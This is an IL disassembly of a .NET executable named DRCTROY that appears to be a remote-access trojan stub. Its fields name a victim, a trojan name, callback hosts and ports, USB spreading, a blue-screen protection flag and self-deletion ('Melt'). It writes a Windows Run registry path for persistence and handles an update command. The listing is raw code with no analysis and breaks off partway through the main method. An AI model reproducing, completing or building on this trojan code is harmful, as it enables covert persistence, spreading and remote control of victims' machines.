
//  Microsoft (R) .NET Framework IL Disassembler.  Version 3.5.30729.1
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.assembly extern mscorlib
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern Microsoft.VisualBasic
{
  .publickeytoken = (B0 3F 5F 7F 11 D5 0A 3A )                         // .?_....:
  .ver 8:0:0:0
}
.assembly extern System
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly extern System.Windows.Forms
{
  .publickeytoken = (B7 7A 5C 56 19 34 E0 89 )                         // .z\V.4..
  .ver 2:0:0:0
}
.assembly DRCTROY
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilationRelaxationsAttribute::.ctor(int32) = ( 01 00 08 00 00 00 00 00 ) 
  .custom instance void [mscorlib]System.Runtime.CompilerServices.RuntimeCompatibilityAttribute::.ctor() = ( 01 00 01 00 54 02 16 57 72 61 70 4E 6F 6E 45 78   // ....T..WrapNonEx
                                                                                                             63 65 70 74 69 6F 6E 54 68 72 6F 77 73 01 )       // ceptionThrows.
  .hash algorithm 0x00008004
  .ver 0:0:0:0
}
.module DRCTROY.exe
// MVID: {6FDAABB0-5455-4D55-A80D-050BC58BA9A6}
.imagebase 0x00400000
.file alignment 0x00000200
.stackreserve 0x00100000
.subsystem 0x0002       // WINDOWS_GUI
.corflags 0x00000003    //  ILONLY 32BITREQUIRED
// Image base: 0x00C30000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi My.MyApplication
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase
{
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.ApplicationBase::.ctor()
    IL_0006:  ret
  } // end of method MyApplication::.ctor

} // end of class My.MyApplication

.class private auto ansi My.MyComputer
       extends [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer
{
  .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0006:  ret
  } // end of method MyComputer::.ctor

} // end of class My.MyComputer

.class private auto ansi sealed beforefieldinit My.MyProject
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.HideModuleNameAttribute::.ctor() = ( 01 00 00 00 ) 
  .custom instance void [System]System.CodeDom.Compiler.GeneratedCodeAttribute::.ctor(string,
                                                                                      string) = ( 01 00 0A 4D 79 54 65 6D 70 6C 61 74 65 07 38 2E   // ...MyTemplate.8.
                                                                                                  30 2E 30 2E 30 00 00 )                            // 0.0.0..
  .class auto ansi sealed nested assembly MyWebServices
         extends [mscorlib]System.Object
  {
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyGroupCollectionAttribute::.ctor(string,
                                                                                                         string,
                                                                                                         string,
                                                                                                         string) = ( 01 00 34 53 79 73 74 65 6D 2E 57 65 62 2E 53 65   // ..4System.Web.Se
                                                                                                                     72 76 69 63 65 73 2E 50 72 6F 74 6F 63 6F 6C 73   // rvices.Protocols
                                                                                                                     2E 53 6F 61 70 48 74 74 70 43 6C 69 65 6E 74 50   // .SoapHttpClientP
                                                                                                                     72 6F 74 6F 63 6F 6C 12 43 72 65 61 74 65 5F 5F   // rotocol.Create__
                                                                                                                     49 6E 73 74 61 6E 63 65 5F 5F 13 44 69 73 70 6F   // Instance__.Dispo
                                                                                                                     73 65 5F 5F 49 6E 73 74 61 6E 63 65 5F 5F 00 00   // se__Instance__..
                                                                                                                     00 ) 
    .method public strict virtual instance bool 
            Equals(object o) cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       13 (0xd)
      .maxstack  2
      .locals init (bool V_0)
      IL_0000:  ldarg.0
      IL_0001:  ldarg.1
      IL_0002:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0007:  call       instance bool [mscorlib]System.Object::Equals(object)
      IL_000c:  ret
    } // end of method MyWebServices::Equals

    .method public strict virtual instance int32 
            GetHashCode() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  1
      .locals init (int32 V_0)
      IL_0000:  ldarg.0
      IL_0001:  call       instance int32 [mscorlib]System.Object::GetHashCode()
      IL_0006:  ret
    } // end of method MyWebServices::GetHashCode

    .method assembly hidebysig instance class [mscorlib]System.Type 
            GetType() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       11 (0xb)
      .maxstack  1
      .locals init (class [mscorlib]System.Type V_0)
      IL_0000:  ldtoken    My.MyProject/MyWebServices
      IL_0005:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_000a:  ret
    } // end of method MyWebServices::GetType

    .method public strict virtual instance string 
            ToString() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  1
      .locals init (string V_0)
      IL_0000:  ldarg.0
      IL_0001:  call       instance string [mscorlib]System.Object::ToString()
      IL_0006:  ret
    } // end of method MyWebServices::ToString

    .method private static !!T  Create__Instance__<.ctor T>(!!T 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  1
      .locals init (!!T V_0)
      IL_0000:  ldarg.0
      IL_0001:  box        !!T
      IL_0006:  brtrue.s   IL_000e

      IL_0008:  call       !!0 [mscorlib]System.Activator::CreateInstance<!!0>()
      IL_000d:  ret

      IL_000e:  ldarg.0
      IL_000f:  ret
    } // end of method MyWebServices::Create__Instance__

    .method private instance void  Dispose__Instance__<T>(!!T& 'instance') cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       16 (0x10)
      .maxstack  2
      .locals init (!!T V_0)
      IL_0000:  ldarg.1
      IL_0001:  ldloca.s   V_0
      IL_0003:  initobj    !!T
      IL_0009:  ldloc.0
      IL_000a:  stobj      !!T
      IL_000f:  ret
    } // end of method MyWebServices::Dispose__Instance__

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method MyWebServices::.ctor

  } // end of class MyWebServices

  .class auto ansi sealed nested assembly ThreadSafeObjectProvider`1<.ctor T>
         extends [mscorlib]System.Object
  {
    .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 00 00 00 ) 
    .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
    .field private static !T m_ThreadStaticValue
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.ThreadStaticAttribute::.ctor() = ( 01 00 00 00 ) 
    .method assembly specialname instance !T 
            get_GetInstance() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      // Code size       28 (0x1c)
      .maxstack  1
      .locals init (!T V_0)
      IL_0000:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0005:  box        !T
      IL_000a:  brtrue.s   IL_0016

      IL_000c:  call       !!0 [mscorlib]System.Activator::CreateInstance<!T>()
      IL_0011:  stsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_0016:  ldsfld     !0 class My.MyProject/ThreadSafeObjectProvider`1<!T>::m_ThreadStaticValue
      IL_001b:  ret
    } // end of method ThreadSafeObjectProvider`1::get_GetInstance

    .method public specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
      .custom instance void [System]System.ComponentModel.EditorBrowsableAttribute::.ctor(valuetype [System]System.ComponentModel.EditorBrowsableState) = ( 01 00 01 00 00 00 00 00 ) 
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method ThreadSafeObjectProvider`1::.ctor

    .property instance !T GetInstance()
    {
      .get instance !T My.MyProject/ThreadSafeObjectProvider`1::get_GetInstance()
    } // end of property ThreadSafeObjectProvider`1::GetInstance
  } // end of class ThreadSafeObjectProvider`1

  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> m_ComputerObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> m_AppObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> m_UserObjectProvider
  .field private static initonly class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> m_MyWebServicesObjectProvider
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       41 (0x29)
    .maxstack  8
    IL_0000:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::.ctor()
    IL_0005:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_000a:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::.ctor()
    IL_000f:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0014:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::.ctor()
    IL_0019:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_001e:  newobj     instance void class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::.ctor()
    IL_0023:  stsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0028:  ret
  } // end of method MyProject::.cctor

  .method assembly specialname static class My.MyComputer 
          get_Computer() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class My.MyComputer V_0)
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer> My.MyProject::m_ComputerObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyComputer>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Computer

  .method assembly specialname static class My.MyApplication 
          get_Application() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class My.MyApplication V_0)
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication> My.MyProject::m_AppObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyApplication>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_Application

  .method assembly specialname static class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User 
          get_User() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User V_0)
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User> My.MyProject::m_UserObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_User

  .method assembly specialname static class My.MyProject/MyWebServices 
          get_WebServices() cil managed
  {
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       11 (0xb)
    .maxstack  1
    .locals init (class My.MyProject/MyWebServices V_0)
    IL_0000:  ldsfld     class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices> My.MyProject::m_MyWebServicesObjectProvider
    IL_0005:  callvirt   instance !0 class My.MyProject/ThreadSafeObjectProvider`1<class My.MyProject/MyWebServices>::get_GetInstance()
    IL_000a:  ret
  } // end of method MyProject::get_WebServices

  .property class My.MyComputer Computer()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0B 4D 79 2E 43 6F 6D 70 75 74 65 72 00 00 ) // ...My.Computer..
    .get class My.MyComputer My.MyProject::get_Computer()
  } // end of property MyProject::Computer
  .property class My.MyApplication Application()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 41 70 70 6C 69 63 61 74 69 6F   // ...My.Applicatio
                                                                                                       6E 00 00 )                                        // n..
    .get class My.MyApplication My.MyProject::get_Application()
  } // end of property MyProject::Application
  .property class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User
          User()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 07 4D 79 2E 55 73 65 72 00 00 )             // ...My.User..
    .get class [Microsoft.VisualBasic]Microsoft.VisualBasic.ApplicationServices.User My.MyProject::get_User()
  } // end of property MyProject::User
  .property class My.MyProject/MyWebServices
          WebServices()
  {
    .custom instance void [System]System.ComponentModel.Design.HelpKeywordAttribute::.ctor(string) = ( 01 00 0E 4D 79 2E 57 65 62 53 65 72 76 69 63 65   // ...My.WebService
                                                                                                       73 00 00 )                                        // s..
    .get class My.MyProject/MyWebServices My.MyProject::get_WebServices()
  } // end of property MyProject::WebServices
} // end of class My.MyProject

.class public auto ansi beforefieldinit DRCTROY
       extends [mscorlib]System.Object
{
  .field public static string VictimName
  .field public static string MUTEXCODE
  .field public static string TrojanName
  .field public static string DirINS
  .field public static string RegKey
  .field public static string Hostes
  .field public static string Ports
  .field public static bool BSODPro
  .field public static bool SreadUSB
  .field public static bool Melt
  .field public static class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer Comput
  .field public static string RegPath
  .field public static class [mscorlib]System.IO.FileInfo OldPath
  .field public static string HF
  .field public static string PF
  .field public static int32 Hc
  .field public static int32 Pc
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       193 (0xc1)
    .maxstack  1
    IL_0000:  ldstr      "[VicName]"
    IL_0005:  stsfld     string DRCTROY::VictimName
    IL_000a:  ldstr      "[M]"
    IL_000f:  stsfld     string DRCTROY::MUTEXCODE
    IL_0014:  ldstr      "[TroName]"
    IL_0019:  stsfld     string DRCTROY::TrojanName
    IL_001e:  ldstr      "[InstDir]"
    IL_0023:  stsfld     string DRCTROY::DirINS
    IL_0028:  ldstr      "[RegKey]"
    IL_002d:  stsfld     string DRCTROY::RegKey
    IL_0032:  ldstr      "[Hosts]"
    IL_0037:  stsfld     string DRCTROY::Hostes
    IL_003c:  ldstr      "[Ports]"
    IL_0041:  stsfld     string DRCTROY::Ports
    IL_0046:  ldstr      "[BSOD]"
    IL_004b:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_0050:  stsfld     bool DRCTROY::BSODPro
    IL_0055:  ldstr      "[USB]"
    IL_005a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_005f:  stsfld     bool DRCTROY::SreadUSB
    IL_0064:  ldstr      "[Melt]"
    IL_0069:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_006e:  stsfld     bool DRCTROY::Melt
    IL_0073:  newobj     instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::.ctor()
    IL_0078:  stsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer DRCTROY::Comput
    IL_007d:  ldstr      "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    IL_0082:  stsfld     string DRCTROY::RegPath
    IL_0087:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
    IL_008c:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_0091:  stsfld     class [mscorlib]System.IO.FileInfo DRCTROY::OldPath
    IL_0096:  ldsfld     string DRCTROY::Hostes
    IL_009b:  call       string DRCTROY::GetHost(string)
    IL_00a0:  stsfld     string DRCTROY::HF
    IL_00a5:  ldsfld     string DRCTROY::Ports
    IL_00aa:  call       string DRCTROY::GetPort(string)
    IL_00af:  stsfld     string DRCTROY::PF
    IL_00b4:  ldc.i4.0
    IL_00b5:  stsfld     int32 DRCTROY::Hc
    IL_00ba:  ldc.i4.0
    IL_00bb:  stsfld     int32 DRCTROY::Pc
    IL_00c0:  ret
  } // end of method DRCTROY::.cctor

  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method DRCTROY::.ctor

  .method public static void  main() cil managed
  {
    .entrypoint
    .custom instance void [mscorlib]System.STAThreadAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       1186 (0x4a2)
    .maxstack  8
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.FileInfo V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             class [mscorlib]System.Threading.Mutex V_3,
             object V_4,
             class [mscorlib]System.Exception V_5,
             object V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             bool V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Exception V_14,
             class [System]System.Net.Sockets.TcpClient V_15,
             uint8[] V_16,
             int32 V_17,
             class [mscorlib]System.Exception V_18,
             class [mscorlib]System.Exception V_19,
             class [mscorlib]System.Exception V_20,
             class [mscorlib]System.Exception V_21,
             object[] V_22,
             object V_23,
             class [mscorlib]Microsoft.Win32.RegistryKey V_24,
             string[] V_25)
    IL_0000:  ldsfld     string DRCTROY::DirINS
    IL_0005:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
    IL_000a:  ldstr      "\\"
    IL_000f:  ldsfld     string DRCTROY::TrojanName
    IL_0014:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0019:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
    IL_001e:  stloc.1
    IL_001f:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0024:  brfalse    IL_0158

    IL_0029:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_002e:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0033:  ldc.i4.0
    IL_0034:  ble        IL_0158

    IL_0039:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_003e:  ldstr      ":"
    IL_0043:  ldc.i4.m1
    IL_0044:  ldc.i4.0
    IL_0045:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_004a:  stloc.s    V_4
    IL_004c:  ldloc.s    V_4
    IL_004e:  ldc.i4.1
    IL_004f:  newarr     [mscorlib]System.Object
    IL_0054:  stloc.s    V_22
    IL_0056:  ldloc.s    V_22
    IL_0058:  ldc.i4.0
    IL_0059:  ldc.i4.0
    IL_005a:  box        [mscorlib]System.Int32
    IL_005f:  stelem.ref
    IL_0060:  ldloc.s    V_22
    IL_0062:  ldnull
    IL_0063:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                           object[],
                                                                                                                           string[])
    IL_0068:  stloc.s    V_23
    IL_006a:  ldloc.s    V_23
    IL_006c:  ldstr      "UP"
    IL_0071:  ldc.i4.0
    IL_0072:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                     object,
                                                                                                                                     bool)
    IL_0077:  brfalse    IL_013f

    .try
    {
      IL_007c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer DRCTROY::Comput
      IL_0081:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0086:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_008b:  ldstr      "di"
      IL_0090:  ldstr      "!"
      IL_0095:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_009a:  leave.s    IL_00ab

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_009c:  dup
      IL_009d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a2:  stloc.s    V_5
      IL_00a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a9:  leave.s    IL_00ab

    }  // end handler
    .try
    {
      IL_00ab:  ldloc.s    V_4
      IL_00ad:  ldc.i4.1
      IL_00ae:  newarr     [mscorlib]System.Object
      IL_00b3:  stloc.s    V_22
      IL_00b5:  ldloc.s    V_22
      IL_00b7:  ldc.i4.0
      IL_00b8:  ldc.i4.1
      IL_00b9:  box        [mscorlib]System.Int32
      IL_00be:  stelem.ref
      IL_00bf:  ldloc.s    V_22
      IL_00c1:  ldnull
      IL_00c2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
                                                                                                                             object[],
                                                                                                                             string[])
      IL_00c7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
      IL_00cc:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_00d1:  stloc.s    V_6
      IL_00d3:  ldloc.s    V_6
      IL_00d5:  ldnull
      IL_00d6:  ldstr      "WaitForExit"
      IL_00db:  ldc.i4.1
      IL_00dc:  newarr     [mscorlib]System.Object
      IL_00e1:  stloc.s    V_22
      IL_00e3:  ldloc.s    V_22
      IL_00e5:  ldc.i4.0
      IL_00e6:  ldc.i4     0x1388
      IL_00eb:  box        [mscorlib]System.Int32
      IL_00f0:  stelem.ref
      IL_00f1:  ldloc.s    V_22
      IL_00f3:  ldnull
      IL_00f4:  ldnull
      IL_00f5:  ldnull
      IL_00f6:  ldc.i4.1
      IL_00f7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_00fc:  pop
      .try
      {
        IL_00fd:  ldloc.s    V_6
        IL_00ff:  ldnull
        IL_0100:  ldstr      "Dispose"
        IL_0105:  ldc.i4.0
        IL_0106:  newarr     [mscorlib]System.Object
        IL_010b:  ldnull
        IL_010c:  ldnull
        IL_010d:  ldnull
        IL_010e:  ldc.i4.1
        IL_010f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_0114:  pop
        IL_0115:  leave.s    IL_0158

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0117:  dup
        IL_0118:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_011d:  stloc.s    V_7
        IL_011f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0124:  leave.s    IL_0158

      }  // end handler
    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0126:  dup
      IL_0127:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012c:  stloc.s    V_8
      IL_012e:  ldc.i4     0x1388
      IL_0133:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0138:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_013d:  leave.s    IL_0158

    }  // end handler
    IL_013f:  ldloc.s    V_23
    IL_0141:  ldstr      ".."
    IL_0146:  ldc.i4.0
    IL_0147:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                     object,
                                                                                                                                     bool)
    IL_014c:  brfalse.s  IL_0158

    IL_014e:  ldc.i4     0x1388
    IL_0153:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    .try
    {
      IL_0158:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer DRCTROY::Comput
